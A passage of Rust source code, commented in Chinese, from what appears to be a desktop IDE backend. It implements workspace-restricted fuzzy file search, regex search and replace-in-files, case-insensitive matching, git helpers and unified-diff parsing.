fn head_path_set(dir: &str, keys: &[String]) -> Option<std::collections::HashSet<String>> {
    if keys.is_empty() {
        return Some(std::collections::HashSet::new());
    }
    let refs: Vec<&str> = keys.iter().map(|s| s.as_str()).collect();
    match git_output(
        git_cmd()
            .arg("-C")
            .arg(dir)
            .args([
                "-c",
                "core.quotepath=false",
                "ls-tree",
                "-r",
                "-z",
                "--name-only",
                "HEAD",
                "--",
            ])
            .args(&refs),
    ) {
        Ok(o) if o.status.success() => Some(
            String::from_utf8_lossy(&o.stdout)
                .split('\0')
                .filter(|s| !s.is_empty())
                .map(|s| s.to_string())
                .collect(),
        ),
        Ok(o) => {
            log::warn!(
                "git ls-tree HEAD 失败: {}（回滚将逐文件探测 HEAD）",
                String::from_utf8_lossy(&o.stderr).trim()
            );
            None
        }
        Err(e) => {
            log::warn!("git ls-tree HEAD 调用失败: {}（回滚将逐文件探测 HEAD）", e);
            None
        }
    }
}

/// 由批量结果推断某个路径是否在 HEAD 中；无法确定返回 None。
///
/// 用「集合包含」而非 pathspec 匹配：含 `*?[` 的名称在 `git ls-tree -- <path>`
/// 里是通配模式，字符串比对会误判，这类名字直接交给逐文件探测。目录用前缀
/// 判断（HEAD 把目录展开成其下的文件）。
fn head_membership(set: &std::collections::HashSet<String>, key: &str) -> Option<bool> {
    if key.is_empty() || key.contains(['*', '?', '[', '\\']) {
        return None;
    }
    if set.contains(key) {
        return Some(true);
    }
    let prefix = format!("{}/", key);
    if set.iter().any(|p| p.starts_with(&prefix)) {
        return Some(true);
    }
    Some(false)
}

#[derive(Serialize, Deserialize, Debug, Clone)]
#[serde(rename_all = "camelCase")]
pub struct FileSearchResultDto {
    pub name: String,
    pub path: String,
    pub is_directory: bool,
}

/// 目录遍历（搜索）的深度上限，作用同 `MAX_SCAN_DEPTH`。
const MAX_SEARCH_DEPTH: u32 = 64;

/// 文件名检索的候选上限：模糊评分要先收集再排序，不能流式截断；
/// 无上限时超大仓库会把几十万条目全装进内存。到 cap 即停（按遍历序），内存有界。
const MAX_SEARCH_CANDIDATES: usize = 20_000;

/// 单次文件名检索的结果上限：`limit` 参数钳制。调用方（SearchEverywhere）
/// 只取 50，无人需要一次拿几千条；不钳制时 `limit = usize::MAX` 会把 cap 内
/// 全部候选序列化回前端（IPC 载荷膨胀）。
const MAX_FILE_SEARCH_RESULTS: usize = 200;

/// 搜索遍历器（Zed `worktree` 的忽略语义）：尊重 `.gitignore`、跳过隐藏文件、
/// 不跟随软链，叠加本仓库的硬忽略表（`is_ignored_entry`）做托底。
///
/// 有意与项目树（`scan_node`）不同：树必须展示被忽略的文件（用户要看到
/// node_modules 真实存在），搜索跳过它们（Zed 同行为：搜出来全是构建产物
/// 等于没搜）。`.gitignore` 命中的文件从此搜不到 —— 有意为之。
///
/// - `require_git(false)`：非 git 目录（用户打开的普通文件夹）同样生效；
/// - `git_global(false)` + `git_exclude(false)`：全局 gitignore 与
///   `.git/info/exclude` 因机器而异，关掉以保证同项目在不同机器上结果一致。
fn search_walker(root: &Path) -> ignore::Walk {
    ignore::WalkBuilder::new(root)
        .hidden(true)
        .git_ignore(true)
        .git_global(false)
        .git_exclude(false)
        .parents(true)
        .require_git(false)
        .follow_links(false)
        .max_depth(Some(MAX_SEARCH_DEPTH as usize))
        .filter_entry(|e| {
            let name = e.file_name().to_string_lossy();
            let is_dir = e.file_type().map(|t| t.is_dir()).unwrap_or(false);
            !is_ignored_entry(&name, is_dir, None)
        })
        .build()
}

#[tauri::command]
pub async fn search_files(
    repo_path: Option<String>,
    query: String,
    limit: Option<usize>,
    registry: tauri::State<'_, WorkspaceRegistry>,
) -> Result<Vec<FileSearchResultDto>, String> {
    // 与 global_search 同源：递归遍历整棵目录树只匹配文件名，大项目上
    // 数百毫秒。SearchEverywhereModal 每次输入防抖 120ms 就触发一次，
    // 同步执行会让 ipc worker 在整棵树的遍历期间无法响应其它命令。
    //
    // 遍历本身也要受工作区授权约束（同 read_directory）：否则一个软链就能
    // 让搜索把工作区外的目录结构读进结果集。registry 是 `State`（非 Send），
    // 因此在进入 spawn_blocking 之前先取出规范化 root。
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let root = authorize_workspace_path(&registry, &dir, false)?;
    tauri::async_runtime::spawn_blocking(move || {
        // limit 钳制（见 MAX_FILE_SEARCH_RESULTS）：评分要全量收集再排序，
        // 不钳制时超大 limit 会把 cap 内全部候选序列化回前端。
        let max = limit.unwrap_or(50).min(MAX_FILE_SEARCH_RESULTS);
        Ok(search_files_impl(&root, &query, max))
    })
    .await
    .map_err(|e| format!("search_files 任务失败: {e}"))?
}

/// 文件名检索实现（`search_files` 的无状态部分，可单测）。
///
/// 空查询保持旧语义：遍历序前 N 个文件（目录不进结果），零评分开销。
/// 前端空查询时本来就不调这里（直接展示已打开文件），该分支只为兼容。
fn search_files_impl(root: &Path, query: &str, max: usize) -> Vec<FileSearchResultDto> {
    if query.is_empty() {
        return search_walker(root)
            .filter_map(|e| e.ok())
            .filter(|e| e.file_type().map(|t| t.is_file()).unwrap_or(false))
            .take(max)
            .map(|e| FileSearchResultDto {
                name: e.file_name().to_string_lossy().to_string(),
                path: e.path().to_string_lossy().to_string(),
                is_directory: false,
            })
            .collect();
    }

    // nucleo 模糊评分（Zed 文件 palette 同款算法）：大小写不敏感 + 智能规范化，
    // 前缀/词边界/驼峰命中加分（`app` 排 `App.tsx` 在 `xapplication` 之前，
    // 旧 `contains` 子串是遍历序、无排序）。
    let mut matcher = nucleo_matcher::Matcher::new(nucleo_matcher::Config::DEFAULT);
    let pattern = nucleo_matcher::pattern::Pattern::parse(
        query,
        nucleo_matcher::pattern::CaseMatching::Ignore,
        nucleo_matcher::pattern::Normalization::Smart,
    );
    let mut buf = Vec::new();
    let mut scored: Vec<(u32, String, String, bool)> = Vec::new();
    for entry in search_walker(root) {
        if scored.len() >= MAX_SEARCH_CANDIDATES {
            break;
        }
        let Ok(entry) = entry else { continue };
        let ft = match entry.file_type() {
            Some(t) => t,
            None => continue,
        };
        // 软链/特殊文件不进结果（与旧实现一致）；目录参与评分（旧实现可搜到目录）
        if !ft.is_file() && !ft.is_dir() {
            continue;
        }
        let name = entry.file_name().to_string_lossy().to_string();
        buf.clear();
        let name_hit = pattern.score(nucleo_matcher::Utf32Str::new(&name, &mut buf), &mut matcher);
        // 相对路径做次级匹配（`comp/sett` 找到 components/SettingsDialog），
        // 分数折半以保证"名中"永远排在"路中"之前。
        let rel = entry
            .path()
            .strip_prefix(root)
            .map(|p| p.to_string_lossy().to_string())
            .unwrap_or_else(|_| entry.path().to_string_lossy().to_string());
        buf.clear();
        let path_hit = pattern.score(nucleo_matcher::Utf32Str::new(&rel, &mut buf), &mut matcher);
        let score = match (name_hit, path_hit) {
            (Some(a), Some(b)) => a.max(b / 2),
            (Some(a), None) => a,
            (None, Some(b)) => b / 2,
            (None, None) => continue,
        };
        scored.push((
            score,
            name,
            entry.path().to_string_lossy().to_string(),
            ft.is_dir(),
        ));
    }
    // 分数降序，同分按路径升序（确定性：同库同查询永远同序，旧遍历序则随文件系统）
    scored.sort_by(|a, b| b.0.cmp(&a.0).then_with(|| a.2.cmp(&b.2)));
    scored.truncate(max);
    scored
        .into_iter()
        .map(|(_, name, path, is_directory)| FileSearchResultDto {
            name,
            path,
            is_directory,
        })
        .collect()
}

#[tauri::command]
#[allow(clippy::too_many_arguments)] // IPC 边界参数是命令签名的一部分
pub async fn global_search(
    repo_path: Option<String>,
    query: String,
    case_sensitive: bool,
    use_regex: Option<bool>,
    whole_word: Option<bool>,
    include: Option<String>,
    max_results: Option<usize>,
    registry: tauri::State<'_, WorkspaceRegistry>,
) -> Result<Vec<SearchResultDto>, String> {
    // 全局搜索要遍历整棵源码树并逐行比对，大仓库上轻松跑几百毫秒。
    // 同步命令占住 ipc:// worker 线程，期间所有其它命令一起排队，
    // 表现为整个 IDE 卡死。丢到 blocking 池让 worker 线程立刻脱身。
    // 授权同 search_files：先取出规范化 root，再把路径 move 进闭包。
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let root = authorize_workspace_path(&registry, &dir, false)?;
    let re = compile_search_regex(
        &query,
        case_sensitive,
        use_regex.unwrap_or(false),
        whole_word.unwrap_or(false),
    )?;
    let glob = compile_search_glob(include.as_deref())?;
    let limit = max_results.unwrap_or(500).min(5000);
    tauri::async_runtime::spawn_blocking(move || {
        Ok(search_dir_regex(&root, &re, glob.as_ref(), limit))
    })
    .await
    .map_err(|e| format!("搜索任务失败: {e}"))?
}

fn compile_search_regex(
    query: &str,
    case_sensitive: bool,
    use_regex: bool,
    whole_word: bool,
) -> Result<regex::Regex, String> {
    if query.is_empty() {
        return Err(crate::error_proto::coded("search_query_empty", ""));
    }
    let mut pattern = if use_regex {
        query.to_string()
    } else {
        regex::escape(query)
    };
    if whole_word {
        pattern = format!(r"\b(?:{pattern})\b");
    }
    regex::RegexBuilder::new(&pattern)
        .case_insensitive(!case_sensitive)
        .build()
        .map_err(|e| crate::error_proto::coded("search_regex_invalid", e.to_string()))
}

fn compile_search_glob(include: Option<&str>) -> Result<Option<globset::GlobMatcher>, String> {
    let Some(include) = include.map(str::trim).filter(|s| !s.is_empty()) else {
        return Ok(None);
    };
    let glob = globset::Glob::new(include)
        .map_err(|e| crate::error_proto::coded("search_glob_invalid", e.to_string()))?;
    Ok(Some(glob.compile_matcher()))
}

fn search_dir_regex(
    root: &Path,
    re: &regex::Regex,
    glob: Option<&globset::GlobMatcher>,
    limit: usize,
) -> Vec<SearchResultDto> {
    let mut results = Vec::new();
    for entry in search_walker(root) {
        if results.len() >= limit {
            break;
        }
        let Ok(entry) = entry else { continue };
        if !entry.file_type().map(|t| t.is_file()).unwrap_or(false) || entry.path_is_symlink() {
            continue;
        }
        let path = entry.path();
        if let Some(g) = glob {
            let rel = path
                .strip_prefix(root)
                .map(|p| p.to_string_lossy().replace('\\', "/"))
                .unwrap_or_default();
            if !g.is_match(&rel) {
                continue;
            }
        }
        if let Ok(meta) = fs::metadata(path) {
            if meta.len() > MAX_SEARCH_FILE_BYTES {
                continue;
            }
        }
        if is_binary_file(path) {
            continue;
        }
        let Ok(bytes) = fs::read(path) else { continue };
        let text = crate::file_encoding::decode_text(&bytes).text;
        let path_str = path.to_string_lossy().to_string();
        for (line_idx, line) in text.lines().enumerate() {
            let Some(m) = re.find(line) else { continue };
            // 前端 JS 用 UTF-16 下标切片高亮；Rust 的字节偏移在中文/emoji
            // 前会错位，这里换算成 UTF-16 code unit 计数。
            let start = line[..m.start()].encode_utf16().count();
            let end = start + line[m.start()..m.end()].encode_utf16().count();
            results.push(SearchResultDto {
                file_path: path_str.clone(),
                line_number: line_idx + 1,
                line_content: line.to_string(),
                match_start: start,
                match_end: end,
            });
            if results.len() >= limit {
                break;
            }
        }
    }
    results
}

#[derive(Serialize, Deserialize, Debug, Clone)]
#[serde(rename_all = "camelCase")]
pub struct ReplaceInFilesResultDto {
    pub files: usize,
    pub occurrences: usize,
    pub errors: Vec<String>,
    /// 被改写的绝对路径：前端据此丢弃/重载已打开缓冲。
    pub changed_paths: Vec<String>,
}

/// Find in Files 的写侧：按同一套匹配规则替换，保留原编码并原子写。
#[tauri::command]
#[allow(clippy::too_many_arguments)] // IPC 边界参数是命令签名的一部分
pub async fn replace_in_files(
    repo_path: Option<String>,
    query: String,
    replacement: String,
    case_sensitive: bool,
    use_regex: Option<bool>,
    whole_word: Option<bool>,
    include: Option<String>,
    dry_run: Option<bool>,
    registry: tauri::State<'_, WorkspaceRegistry>,
    cache: tauri::State<'_, crate::file_cache::FileCache>,
) -> Result<ReplaceInFilesResultDto, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    // 替换是写操作：只读工作区必须拒绝，和 write_file_content 同一闸门。
    let root = authorize_workspace_path(&registry, &dir, true)?;
    let re = compile_search_regex(
        &query,
        case_sensitive,
        use_regex.unwrap_or(false),
        whole_word.unwrap_or(false),
    )?;
    let glob = compile_search_glob(include.as_deref())?;
    let use_regex = use_regex.unwrap_or(false);
    let dry_run = dry_run.unwrap_or(false);
    let result: ReplaceInFilesResultDto = tauri::async_runtime::spawn_blocking(move || {
        let mut result = ReplaceInFilesResultDto {
            files: 0,
            occurrences: 0,
            errors: Vec::new(),
            changed_paths: Vec::new(),
        };
        for entry in search_walker(&root) {
            let Ok(entry) = entry else { continue };
            if !entry.file_type().map(|t| t.is_file()).unwrap_or(false) || entry.path_is_symlink() {
                continue;
            }
            let path = entry.path();
            if let Some(g) = glob.as_ref() {
                let rel = path
                    .strip_prefix(&root)
                    .map(|p| p.to_string_lossy().replace('\\', "/"))
                    .unwrap_or_default();
                if !g.is_match(&rel) {
                    continue;
                }
            }
            if let Ok(meta) = fs::metadata(path) {
                if meta.len() > MAX_SEARCH_FILE_BYTES {
                    continue;
                }
            }
            if is_binary_file(path) {
                continue;
            }
            let bytes = match fs::read(path) {
                Ok(b) => b,
                Err(e) => {
                    result.errors.push(format!("{}: {e}", path.display()));
                    continue;
                }
            };
            let decoded = crate::file_encoding::decode_text(&bytes);
            let count = re.find_iter(&decoded.text).count();
            if count == 0 {
                continue;
            }
            let replaced = if use_regex {
                re.replace_all(&decoded.text, replacement.as_str())
                    .into_owned()
            } else {
                re.replace_all(&decoded.text, regex::NoExpand(replacement.as_str()))
                    .into_owned()
            };
            if dry_run {
                result.files += 1;
                result.occurrences += count;
                continue;
            }
            let encoded =
                match crate::file_encoding::encode_text(&replaced, Some(&decoded.encoding)) {
                    Ok(b) => b,
                    Err(e) => {
                        result.errors.push(format!("{}: {e}", path.display()));
                        continue;
                    }
                };
            match crate::file_encoding::atomic_write(path, &encoded) {
                Ok(()) => {
                    result.files += 1;
                    result.occurrences += count;
                    result
                        .changed_paths
                        .push(path.to_string_lossy().to_string());
                }
                Err(e) => result.errors.push(format!("{}: {e}", path.display())),
            }
        }
        Ok::<ReplaceInFilesResultDto, String>(result)
    })
    .await
    .map_err(|e| format!("替换任务失败: {e}"))??;
    // 绕过 write_file_content 的批量写也要显式失效读缓存，否则粗粒度
    // mtime 的文件系统上可能继续命中替换前的内容。
    for p in &result.changed_paths {
        cache.invalidate(std::path::Path::new(p));
    }
    Ok(result)
}

/// 预处理后的查询串。
///
/// `search_dir_internal` 逐行调用 `find_ci`，而 needle 在整次搜索里恒定：
/// 把「恒定不变的转换」（小写化、char 序列化）提到循环外只做一次。旧实现
/// 每行都要重算 needle 的两种表示（中文注释仓库里每行 4 次堆分配）。
struct CiNeedle<'a> {
    /// needle 全 ASCII 时给出字节视图：UTF-8 中 <0x80 的字节必定是独立字符，
    /// 可以直接做字节级不敏感比较（零分配快路径）。
    ascii: Option<&'a [u8]>,
    /// 整体小写化后的 char 序列（Unicode 路径；大小写折叠可能不等长，如 İ → i+U+0307）
    folded: Vec<char>,
}

fn prepare_ci_needle(needle: &str) -> CiNeedle<'_> {
    CiNeedle {
        ascii: if needle.is_ascii() {
            Some(needle.as_bytes())
        } else {
            None
        },
        folded: needle.to_lowercase().chars().collect(),
    }
}

/// 字节级不敏感子串查找（仅用于「needle 全 ASCII」时）：
/// 逐字节比较、零分配。多字节字符的字节全部 ≥0x80，不可能与 ASCII 字节相等，
/// 因此在任意 UTF-8 文本上按字节滑窗都不会切进多字节字符中间。
fn find_ci_bytes(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    if needle.len() > haystack.len() {
        return None;
    }
    (0..=haystack.len() - needle.len()).find(|&i| {
        haystack[i..i + needle.len()]
            .iter()
            .zip(needle)
            .all(|(a, b)| a.eq_ignore_ascii_case(b))
    })
}

/// 大小写不敏感的子串查找，返回**字节偏移**（与 `str::find` 一致，调用方
/// 可直接拿它切原串）。
///
/// ASCII 快路径：逐字节比较、零分配（绝大多数源码行是 ASCII）。
/// 非 ASCII 走 Unicode 路径：两侧整体 `to_lowercase()` 后按 char 比较。
///
/// 之前基于字节偏移滑窗的实现会在多字节边界上做 `&haystack[i..]` 切片，
/// 遇到含中文 / 带音标字符的行直接 panic —— 本版本是 char 安全实现。
pub fn find_ci(haystack: &str, needle: &str) -> Option<usize> {
    if needle.is_empty() {
        return Some(0);
    }
    find_ci_prepared(haystack, &prepare_ci_needle(needle))
}

/// `find_ci` 的预编译版本：逐行循环里复用同一份 needle 表示。
/// 匹配语义与 `find_ci` 完全一致（含非 ASCII 行里「非 ASCII 字符折叠出
/// ASCII」的情形，如 İ → i̇）。
fn find_ci_prepared(haystack: &str, needle: &CiNeedle<'_>) -> Option<usize> {
    if needle.folded.is_empty() {
        return Some(0);
    }
    if let Some(bytes) = needle.ascii {
        if let Some(pos) = find_ci_bytes(haystack.as_bytes(), bytes) {
            return Some(pos);
        }
        // 字节级未命中且整行都是 ASCII：Unicode 折叠不可能再产生新命中
        if haystack.is_ascii() {
            return None;
        }
        // 非 ASCII 行还要走一次 Unicode 路径：非 ASCII 字符折叠后可能变成
        // ASCII（İ → i̇），字节级看不见这种匹配
    }

    // Unicode 路径：to_lowercase 对个别字符会展开成多个 char（如 İ →
    // i + U+0307），按 char 序列比较天然处理这种「大小写变换不等长」。
    let h: Vec<char> = haystack.to_lowercase().chars().collect();
    let n = &needle.folded;
    if n.len() > h.len() {
        return None;
    }
    for start in 0..=(h.len() - n.len()) {
        if h[start..start + n.len()] == n[..] {
            // char 下标映射回原串字节偏移，保证返回值可以直接切原串
            return haystack.char_indices().nth(start).map(|(b, _)| b);
        }
    }
    None
}

#[cfg(test)]
fn search_dir_internal(
    dir: &Path,
    query: &str,
    case_sensitive: bool,
    results: &mut Vec<SearchResultDto>,
    limit: usize,
) {
    // needle 恒定：预编译一次，避免每行重算（见 CiNeedle）
    let ci_needle = if case_sensitive {
        None
    } else {
        Some(prepare_ci_needle(query))
    };

    // 手写递归 → ignore 遍历（与 search_files 同一套忽略语义）：
    // .gitignore 命中、隐藏文件、软链、硬忽略表都不进内容搜索。
    // 单文件体积 / 二进制守门保留（见 MAX_SEARCH_FILE_BYTES / is_binary_file）。
    for entry in search_walker(dir) {
        if results.len() >= limit {
            return;
        }
        let Ok(entry) = entry else { continue };
        // 目录由遍历器下探（max_depth 兜底），这里只处理文件。
        // follow_links(false) 保证不下探软链，但软链条目本身仍会产出，
        // 必须显式跳过（旧实现同样跳过）。
        if !entry.file_type().map(|t| t.is_file()).unwrap_or(false) {
            continue;
        }
        if entry.path_is_symlink() {
            continue;
        }
        let path = entry.path();
        // 单文件过大（monaco/ts.worker 等构建产物普遍 4-8 MB）时整体
        // read_to_string 会在 tokio blocking 线程上产生同量级的瞬时
        // 分配；二进制文件即使读进来也会因 UTF-8 校验失败被丢弃，
        // 等于白付一次完整读盘。两者在打开文件前筛掉。
        if let Ok(meta) = fs::metadata(path) {
            if meta.len() > MAX_SEARCH_FILE_BYTES {
                continue;
            }
        }
        if is_binary_file(path) {
            continue;
        }
        // 路径串每文件只做一次：同一文件命中 N 行时旧实现每行都
        // `to_string_lossy().to_string()` 两次（file_path 字段 + 下一轮的 path），
        // 大结果集下是纯浪费的重复分配 + 重复 UTF-8 校验。
        let path_str = path.to_string_lossy().to_string();
        if let Ok(content) = fs::read_to_string(path) {
            for (line_idx, line) in content.lines().enumerate() {
                let pos = match (&ci_needle, case_sensitive) {
                    (_, true) => line.find(query),
                    (Some(needle), false) => find_ci_prepared(line, needle),
                    (None, false) => find_ci(line, query),
                };

                if let Some(pos) = pos {
                    results.push(SearchResultDto {
                        file_path: path_str.clone(),
                        line_number: line_idx + 1,
                        line_content: line.trim().to_string(),
                        match_start: pos,
                        match_end: pos + query.len(),
                    });
                    if results.len() >= limit {
                        return;
                    }
                }
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Diff 数据
// ---------------------------------------------------------------------------

#[derive(Serialize, Deserialize, Debug, Clone)]
#[serde(rename_all = "camelCase")]
pub struct DiffLineDto {
    /// "context" | "add" | "del" | "hunk" | "meta"
    pub kind: String,
    /// 旧文件行号（新增行为 None）
    pub old_line: Option<u32>,
    /// 新文件行号（删除行为 None）
    pub new_line: Option<u32>,
    pub text: String,
    /// 该 +/- 行末尾没有换行符（unified diff 的 "\ No newline at end of file" 标记）
    #[serde(skip_serializing_if = "Option::is_none")]
    pub no_newline: Option<bool>,
    /// EOF 语义：该 +/- 行是「新文件末行且末行无换行」时置 true——
    /// 表示旧文件在这个内容之后可能还有被折叠的尾行（典型：空白行）
    #[serde(skip_serializing_if = "Option::is_none")]
    pub eof_no_newline: Option<bool>,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
#[serde(rename_all = "camelCase")]
pub struct FileDiffDto {
    pub path: String,
    pub old_path: Option<String>,
    pub is_new: bool,
    pub is_deleted: bool,
    pub is_binary: bool,
    pub additions: u32,
    pub deletions: u32,
    pub lines: Vec<DiffLineDto>,
    /// 行数封顶标记：`lines` 被截断时为 true。增删计数是全量解析的，不受影响。
    /// 前端据此展示"差异过大，仅显示前 N 行"而不是静默丢内容。
    #[serde(skip_serializing_if = "Option::is_none")]
    pub truncated: Option<bool>,
}

/// 单个 diff 展示行数上限：`git show` 整个大提交可达几十万行文本 + 等量 DTO，
///
/// 全量过 IPC 会让前端一次挂载几十万个行对象（JSON 解析 + React 虚拟化窗口
/// 之外的全量数组仍驻留）。计数在解析期已算完，截断只丢展示行——用户照样
/// 看到正确的 +N/-N，只是超长尾部不渲染（Zed 对病态输入的 fallback 同思路）。
pub const MAX_DIFF_LINES: usize = 20_000;

/// 封顶 diff 展示行：超限截断并标记，未超限原样返回（避免无谓的 Vec 重分配）。
pub fn cap_diff_lines(mut lines: Vec<DiffLineDto>) -> (Vec<DiffLineDto>, Option<bool>) {
    if lines.len() > MAX_DIFF_LINES {
        lines.truncate(MAX_DIFF_LINES);
        (lines, Some(true))
    } else {
        (lines, None)
    }
}

#[derive(Serialize, Deserialize, Debug, Clone)]
#[serde(rename_all = "camelCase")]
pub struct CommitFileDto {
    pub path: String,
    /// "M" | "A" | "D" | "R"
    pub status: String,
    pub additions: u32,
    pub deletions: u32,
}

/// 解析 unified diff 文本为结构化行，同时给出行号。
fn parse_unified_diff(text: &str) -> (Vec<DiffLineDto>, u32, u32) {
    let mut lines = Vec::new();
    let mut old_line = 0u32;
    let mut new_line = 0u32;
    let mut additions = 0u32;
    let mut deletions = 0u32;
    // hunk 内不能再按前缀判「文件头」：内容行 `-- foo` 的 diff 行是 `--- foo`，
    // 与删除侧文件头同形，误判会让该行以 meta 身份被前端过滤掉（用户以为没改），
    // 该 hunk 之后的行号与增删计数也整体偏移。状态位在 `diff --git` 清、`@@` 置。
    let mut in_hunk = false;

    for raw in text.lines() {
        if raw.starts_with("@@") {
            in_hunk = true;
            // @@ -old,count +new,count @@
            let body = raw.trim_start_matches('@').trim_start_matches('@');
            let body = body.trim_end_matches('@').trim();
            let mut parts = body.split_whitespace();
            if let Some(old_part) = parts.next() {
                old_line = old_part
                    .trim_start_matches('-')
                    .split(',')
                    .next()
                    .and_then(|v| v.parse().ok())
                    .unwrap_or(0);
            }
            if let Some(new_part) = parts.next() {
                new_line = new_part
                    .trim_start_matches('+')
                    .split(',')
                    .next()
                    .and_then(|v| v.parse().ok())
                    .unwrap_or(0);
            }
            lines.push(DiffLineDto {
                kind: "hunk".to_string(),
                no_newline: None,
                eof_no_newline: None,
                old_line: None,
                new_line: None,
                text: raw.to_string(),
            });
            continue;
        }

        if raw.starts_with("diff --git") {
            in_hunk = false;
        }

        // 文件级头部（diff --git / index / --- / +++）；仅 hunk 之外才可能是头部
        if !in_hunk
            && (raw.starts_with("diff --git")
                || raw.starts_with("index ")
                || raw.starts_with("--- ")
                || raw.starts_with("+++ ")
                || raw.starts_with("new file")
                || raw.starts_with("deleted file")
                || raw.starts_with("similarity index")
                || raw.starts_with("rename ")
                || raw.starts_with("Binary files"))
        {
            lines.push(DiffLineDto {
                kind: "meta".to_string(),
                no_newline: None,
                eof_no_newline: None,
                old_line: None,
                new_line: None,
                text: raw.to_string(),
            });
            continue;
        }

        // "\ No newline at end of file"：不是内容行，只修饰紧邻的前一个 +/- 行；
        // 当作正文解析会伪造一行 context 并污染后续行号
        if raw.starts_with('\\') {
            // "\ No newline at end of file"：不是内容行，只修饰紧邻的前一个 +/- 行。
            // 落在 add 上 = 新文件末行无换行（eof_no_newline）；落在 del 上 = 旧文件末行
            // 无换行。具体归整（把 -X/+X 折叠对还原成空白尾行增删）在解析末尾统一做。
            if let Some(last) = lines.last_mut() {
                if last.kind == "add" || last.kind == "del" {
                    last.no_newline = Some(true);
                    if last.kind == "add" {
                        last.eof_no_newline = Some(true);
                    }
                }
            }
            continue;
        }

        if let Some(rest) = raw.strip_prefix('+') {
            additions += 1;
            lines.push(DiffLineDto {
                kind: "add".to_string(),
                no_newline: None,
                eof_no_newline: None,
                old_line: None,
                new_line: Some(new_line),
                text: rest.to_string(),
            });
            new_line += 1;
        } else if let Some(rest) = raw.strip_prefix('-') {
            deletions += 1;
            lines.push(DiffLineDto {
                kind: "del".to_string(),
                no_newline: None,
                eof_no_newline: None,
                old_line: Some(old_line),
                new_line: None,
                text: rest.to_string(),
            });
            old_line += 1;
        } else {
            let rest = raw.strip_prefix(' ').unwrap_or(raw);
            lines.push(DiffLineDto {
                kind: "context".to_string(),
                old_line: Some(old_line),
                new_line: Some(new_line),
                text: rest.to_string(),
                no_newline: None,
                eof_no_newline: None,
            });
            old_line += 1;
            new_line += 1;
        }
    }

    normalize_eof_pairs(&mut lines, &mut additions, &mut deletions);

    (lines, additions, deletions)
}

/// 补丁的文件级头标志（新增 / 删除 / 二进制）。
#[derive(Default, Clone, Copy, Debug, PartialEq, Eq)]
struct PatchHeaderFlags {
    is_new: bool,
    is_deleted: bool,
    is_binary: bool,
}

/// 只从**文件级头行**判定新增 / 删除 / 二进制。
///
/// 反例（本仓库真实发生过）：`text.contains("Binary files")` 这种裸子串判断，
/// 会把 diff 正文里的同名代码行算进来 —— `src-tauri/src/commands.rs` 自身就有
/// `text.contains("Binary files")` 这行，于是它的补丁一旦带上该行上下文/增删，
/// 纯文本文件就被标成二进制：前端 `readyForMonaco` 为假、行渲染又要求
/// `!isBinary`，diff 页整块空白（连"二进制文件"提示都不会出现，因为
/// `visibleLines` 非空）。`new file mode` / `deleted file mode` 同理，会让普通
/// 修改被当成新增文件，前端据此把旧侧取成 HEAD 版本，比较基准直接错掉。
///
/// 因此只认解析器判为 `meta` 的行：meta 仅产生于 **hunk 之外**（`@@` 置位、
/// `diff --git` 复位），而 hunk 内正文行必然带 ' ' / '+' / '-' 前缀，不可能
/// 以这些头前缀出现。
fn patch_header_flags(lines: &[DiffLineDto]) -> PatchHeaderFlags {
    let mut flags = PatchHeaderFlags::default();
    for line in lines.iter().filter(|l| l.kind == "meta") {
        if line.text.starts_with("new file mode") {
            flags.is_new = true;
        } else if line.text.starts_with("deleted file mode") {
            flags.is_deleted = true;
        } else if line.text.starts_with("Binary files") {
            flags.is_binary = true;
        }
    }
    flags
}

/// 文件相对 HEAD 是否为「新增」：未跟踪（`??`）或已暂存的新文件（`A`/`AM`）。
///
/// 这两类文件的「工作区 vs 索引」比较天然为空 —— 前者根本不进 diff，
/// 后者索引与工作区内容一致 —— 直接返回空会让用户看到「没有未提交的改动」，
/// 而实际语义是「整个文件都是新增内容」（对齐 PyCharm）。
fn is_new_file_vs_head(dir: &str, path: &str) -> bool {
    let out = git_output(git_cmd().arg("-C").arg(dir).args([
        "status",
        "--porcelain=v1",
        "--untracked-files=all",
        "--",
        path,
    ]));
    match out {
        Ok(o) if o.status.success() => {
            let stdout = String::from_utf8_lossy(&o.stdout);
            let line = stdout.lines().next().unwrap_or("");
            // porcelain 首列：? = 未跟踪，A = 已暂存的新文件（AM = 暂存后又有改动，
            // 那种情况下工作区 diff 非空，不会走到这里）
            matches!(line.chars().next(), Some('?') | Some('A'))
        }
        Ok(_) => false,
        Err(e) => {
            log::warn!("git status 探测新增文件 {} 失败: {}", path, e);
            false
        }
    }
}

/// 新增文件的完整差异：与空文件做 `--no-index` 比较，得到「全新增」patch。
///
/// 返回 `None` 表示路径不在磁盘上或 git 未产出可用差异（调用方保持空结果）。
/// `path` 允许绝对路径（join 后仍是原路径）。
fn diff_against_empty_file(dir: &str, path: &str) -> Option<(Vec<DiffLineDto>, u32, u32, bool)> {
    if !Path::new(dir).join(path).is_file() {
        return None;
    }
    let null_dev = if cfg!(windows) { "NUL" } else { "/dev/null" };
    // --no-index 在有差异时退出码为 1，run_git_diff 视为正常
    let text = run_git_diff(
        dir,
        &[
            "diff",
            "--no-color",
            "--no-ext-diff",
            "--no-index",
            null_dev,
            path,
        ],
    )
    .ok()?;
    let (lines, additions, deletions) = parse_unified_diff(&text);
    let is_binary = patch_header_flags(&lines).is_binary;
    if lines.is_empty() && !is_binary {
        return None;
    }
    Some((lines, additions, deletions, is_binary))
}

/// EOF 换行差异的展示归整（对齐 PyCharm / 编辑器心智模型）。
///
/// 末行只有换行符不同时，git 输出内容相同的 -X/+X 对；直接渲染会让用户以为
/// 这一行被改动。归整为「内容行不变（context）+ 一个空白尾行的增/删」，
/// 并把 eof 标记挂到空白尾行上——于是 unified/并排两种视图都显示为
/// 「旧文件末尾的空白行没了（或新文件多了一个空白行）」。
fn normalize_eof_pairs(lines: &mut Vec<DiffLineDto>, additions: &mut u32, deletions: &mut u32) {
    // 方向一：新文件末行无换行（标记落在 add 上）→ 旧文件末尾多一个空白行
    if let Some(ai) = lines
        .iter()
        .rposition(|l| l.kind == "add" && l.eof_no_newline == Some(true))
    {
        let text = lines[ai].text.clone();
        let new_line = lines[ai].new_line;
        let mut di = None;
        for k in (0..ai).rev() {
            match lines[k].kind.as_str() {
                "del" if lines[k].text == text => {
                    di = Some(k);
                    break;
                }
                "del" => {}
                _ => break,
            }
        }
        if let Some(di) = di {
